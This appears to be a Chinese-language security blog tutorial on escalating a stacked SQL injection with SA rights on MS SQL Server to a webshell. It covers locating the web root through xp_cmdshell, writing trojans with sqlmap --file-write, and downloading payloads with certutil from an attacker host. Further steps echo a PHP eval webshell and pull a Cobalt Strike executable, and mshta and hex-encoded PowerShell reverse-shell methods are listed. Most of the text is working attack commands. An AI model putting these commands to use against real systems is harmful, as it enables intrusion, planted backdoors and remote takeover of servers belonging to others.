**目录**

[查找网站绝对路径](#t0)

[往网站目录写入木马](#t1)

[结尾语](#t2)

* * *

利用前提：

*   目标网站注入支持堆叠注入
*   当前权限是 SA 权限
*   无法使用 --os-shell 或者是 使用 --os-shell 执行命令不正常(无回显或不能执行弹shell操作)

![](https://img-blog.csdnimg.cn/20200426101757768.png)

![](https://img-blog.csdnimg.cn/20200426100457213.png)

![](https://img-blog.csdnimg.cn/2020042610254678.png)

这里很多人就会问了，既然是 SA 权限，不是可以直接利用 xp\_cmdshell 执行系统命令吗？对，没错，但是你这里执行系统命令有问题，具体表现为无回显 或者 是执行弹shell操作失败(有可能是该机器不通外网或者是有杀软)。

那么，我们想进一步的获取该系统的webshell，如何操作呢？

我们这个获取权限的思路：找到目标网站的绝对路径，然后往绝对路径下写入木马，然后远程连接木马获取权限。

### 查找网站绝对路径

> 那么，如何找到目标网站的绝对路径呢？

我们这里的思路是通过先找到目标网站的一个文件，然后通过遍历目标服务器的磁盘，找到该文件，将其路径写入自建的表中，然后再读取该表得到网站绝对路径。

先查看当前数据库 --current-db ，这里假设当前数据库为 Hack  
![](https://img-blog.csdnimg.cn/20200426104144794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后在当前数据库下创建一个表

```
创建表hack，并添加一个tmp的字段      
create table testtest (tmp varchar(1000));--
```


![](https://img-blog.csdnimg.cn/2020042610482014.png)

查看该 testtest 表是否创建成功

```
sqlmap --random-agent --batch -r 1 -D Hack --tables
```


![](https://img-blog.csdnimg.cn/20200426105007356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后在目标系统上找一个比较特殊的文件，然后在目标机器上查找该文件的路径，并写入我们创建的表中。我们查看源代码，随便找一个文件即可。

![](https://img-blog.csdnimg.cn/20200426105235408.png)

```
查找目标机器C盘下的login_main.png路径，并将结果写入刚刚创建的testtest表的tmp字段      
;insert into testtest(tmp) exec master..xp_cmdshell 'dir /s /b c:\login_main.png';--
```


这里根据响应的时间长度可知执行了该命令，因为该查找命令需要执行时间 

![](https://img-blog.csdnimg.cn/20200426105440326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
sqlmap --random-agent --batch -r 1 -D Hack -T testtest --dump
```


读取数据，得到目标网站绝对路径为：xxxx

![](https://img-blog.csdnimg.cn/20200426105700532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 往网站目录写入木马

**通过sqlmap的--file-write写马**

写入目标到该路径下

```
sqlmap --random-agent --batch -r 1 --file-write 1.aspx --file-dest "xx\xx\aaa.aspx"
```


![](https://img-blog.csdnimg.cn/20200426110718549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**通过搭建HTTP服务，在目标主机远程下载木马**

这个使用的前提是目标机器可以访问外网

```
1;exec master..xp_cmdshell 'certutil -urlcache -split -f http://x.x.x.x/aa.aspx C:\phpstudy\www\aaa.aspx';--
```


![](https://img-blog.csdnimg.cn/20200426162147294.png)

**通过手动写入木马**

如果是PHP类型的网站，执行以下命令

```
1;exec master..xp_cmdshell 'echo ^<?php @eval($_POST[x]);?^> > C:\phpstudy\www\shell.php';--
```


### 结尾语

如果可以执行 --os-shell 直接反弹CS最好。

不能的话，利用上面的方法写马连接。但是碰到过写入木马连接不上的。最后通过远程下载木马，然后在--os-shell里面执行该木马反弹shell。

```
;exec+master..xp_cmdshell+'certutil+-urlcache+-split+-f+http://x.x.x.x:60000/cs.exe+d:/www/xx.com/xyzx.exe';--
```


![](https://img-blog.csdnimg.cn/20200824123242384.png)

![](https://img-blog.csdnimg.cn/20200824123311139.png)

还有一种情况是，通过sqlmap的os-shell的时候不能反弹cs，但是通过数据包执行能反弹。那么，我们可以通过哪些方式反弹呢？

```
方式一：      
mshta http://xx.xx.xx.xx/download/file.ext       
方式二：      
DECLARE @t VARCHAR(8000) SET @t=(powershell反弹命令的hex编码) EXEC master..xp_cmdshell @t;--
```


![](https://img-blog.csdnimg.cn/20201012100518198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20201012100138236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)